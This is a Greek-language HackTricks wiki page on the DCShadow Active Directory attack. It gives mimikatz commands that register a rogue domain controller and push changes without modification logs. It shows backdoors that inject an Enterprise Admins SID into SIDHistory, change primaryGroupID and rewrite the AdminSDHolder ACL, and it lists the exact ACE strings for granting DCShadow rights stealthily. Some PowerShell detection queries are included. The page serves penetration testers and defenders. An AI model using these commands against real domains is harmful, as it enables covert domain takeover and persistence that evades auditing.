# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **προωθήσει attributes** (SIDHistory, SPNs...) σε καθορισμένα objects **χωρίς να αφήσει logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε δικαιώματα **DA** και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε εσφαλμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.<sup>[[2]](#references)</sup>

Για να εκτελέσετε την επίθεση χρειάζεστε 2 instances του mimikatz. Το ένα θα εκκινήσει τους RPC servers με δικαιώματα SYSTEM (πρέπει να υποδείξετε εδώ τις αλλαγές που θέλετε να πραγματοποιήσετε) και το άλλο instance θα χρησιμοποιηθεί για την προώθηση των τιμών:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Σημειώστε ότι το **`elevate::token`** δεν θα λειτουργήσει σε `mimikatz1` session, καθώς αυτό αύξησε τα privileges του thread, ενώ εμείς πρέπει να αυξήσουμε το **privilege του process**.\
Μπορείτε επίσης να επιλέξετε ένα αντικείμενο "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Μπορείτε να κάνετε push τις αλλαγές από έναν DA ή από έναν user με αυτά τα ελάχιστα permissions:

- Στο **domain object**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- Το **Sites object** (και τα children του) στο **Configuration container**:
- _CreateChild and DeleteChild_
- Το object του **computer που είναι registered ως DC**:
- _WriteProperty_ (όχι Write)
- Το **target object**:
- _WriteProperty_ (όχι Write)

Μπορείτε να χρησιμοποιήσετε το [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) για να δώσετε αυτά τα privileges σε έναν unprivileged user (σημειώστε ότι αυτό θα αφήσει κάποια logs). Αυτό είναι πολύ πιο restrictive από το να έχετε DA privileges.\
Για παράδειγμα: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Αυτό σημαίνει ότι το username _**student1**_, όταν είναι logged on στο machine _**mcorp-student1**_, έχει DCShadow permissions πάνω στο object _**root1user**_.

## Χρήση του DCShadow για τη δημιουργία backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Κατάχρηση primary group, κενά στην απαρίθμηση και detection

- Το `primaryGroupID` είναι ξεχωριστό attribute από τη λίστα `member` του group. Τα DCShadow/DSInternals μπορούν να το γράψουν απευθείας (π.χ. να ορίσουν `primaryGroupID=512` για το **Domain Admins**) χωρίς επιβολή από το on-box LSASS, αλλά το AD εξακολουθεί να **μετακινεί** τον user: η αλλαγή του PGID αφαιρεί πάντα τη συμμετοχή από το προηγούμενο primary group (η ίδια συμπεριφορά ισχύει για οποιοδήποτε target group), επομένως δεν μπορείτε να διατηρήσετε την παλιά primary-group membership.<sup>[[1]](#references)</sup>
- Τα default εργαλεία αποτρέπουν την αφαίρεση ενός user από το τρέχον primary group του (`ADUC`, `Remove-ADGroupMember`), επομένως η αλλαγή του PGID συνήθως απαιτεί απευθείας directory writes (DCShadow/`Set-ADDBPrimaryGroup`).
- Η αναφορά membership είναι ασυνεπής:
- **Περιλαμβάνει** members που προκύπτουν από primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Παραλείπει** members που προκύπτουν από primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit κατά την επιθεώρηση του `member`, `Get-ADUser <user> -Properties memberOf`.
- Οι recursive έλεγχοι μπορεί να παραλείψουν primary-group members αν το **primary group** είναι το ίδιο nested (π.χ. το PGID ενός user δείχνει σε ένα nested group μέσα στο Domain Admins)· το `Get-ADGroupMember -Recursive` ή τα LDAP recursive filters δεν θα επιστρέψουν αυτόν τον user, εκτός αν η recursion επιλύει ρητά τα primary groups.
- DACL tricks: οι attackers μπορούν να **αρνηθούν το ReadProperty** στο `primaryGroupID` του user (ή στο attribute `member` του group για groups που δεν προστατεύονται από το AdminSDHolder), αποκρύπτοντας την effective membership από τα περισσότερα PowerShell queries· το `net group` θα εξακολουθεί να επιλύει τη membership. Τα groups που προστατεύονται από το AdminSDHolder θα επαναφέρουν τέτοιες αρνήσεις.

Παραδείγματα detection/monitoring:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Διασταυρώστε τα privileged groups συγκρίνοντας τα αποτελέσματα του `Get-ADGroupMember` με τα `Get-ADGroup -Properties member` ή το ADSI Edit, ώστε να εντοπίσετε ασυμφωνίες που προκαλούνται από το `primaryGroupID` ή hidden attributes.<sup>[[1]](#references)</sup>

## Shadowception - Απόδοση δικαιωμάτων DCShadow με χρήση DCShadow (χωρίς logs τροποποιημένων permissions)

Πρέπει να προσθέσουμε τα ακόλουθα ACEs με το SID του χρήστη μας στο τέλος:<sup>[[2]](#references)</sup>

- Στο domain object:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Στο attacker computer object: `(A;;WP;;;UserSID)`
- Στο target user object: `(A;;WP;;;UserSID)`
- Στο Sites object στο Configuration container: `(A;CI;CCDC;;;UserSID)`

Για να λάβετε το τρέχον ACE ενός object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Παρατηρήστε ότι σε αυτήν την περίπτωση πρέπει να πραγματοποιήσετε **πολλαπλές αλλαγές,** όχι μόνο μία. Επομένως, στη **mimikatz1 session** (RPC server) χρησιμοποιήστε την παράμετρο **`/stack` με κάθε αλλαγή** που θέλετε να πραγματοποιήσετε. Με αυτόν τον τρόπο, θα χρειαστεί να χρησιμοποιήσετε το **`/push`** μόνο μία φορά, ώστε να πραγματοποιηθούν όλες οι συσσωρευμένες αλλαγές στον rouge server.

[**Περισσότερες πληροφορίες σχετικά με το DCShadow στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## Αναφορές

- [1] [TrustedSec - Περιπέτειες στη συμπεριφορά, την αναφορά και την εκμετάλλευση του Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up στο ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
